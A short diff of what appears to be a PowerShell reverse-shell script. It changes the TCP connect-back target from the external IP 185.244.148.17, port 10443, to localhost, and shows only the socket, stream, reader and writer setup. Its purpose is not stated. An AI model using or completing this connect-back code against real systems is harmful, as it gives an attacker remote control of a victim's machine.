@@ -1,4 +1,4 @@
-$socket = New-Object System.Net.Sockets.TCPClient("185.244.148.17", 10443)
+$socket = New-Object System.Net.Sockets.TCPClient("127.0.0.1", 10443)
 $stream = $socket.GetStream()
 $reader = New-Object System.IO.StreamReader($stream)
 $writer = New-Object System.IO.StreamWriter($stream)
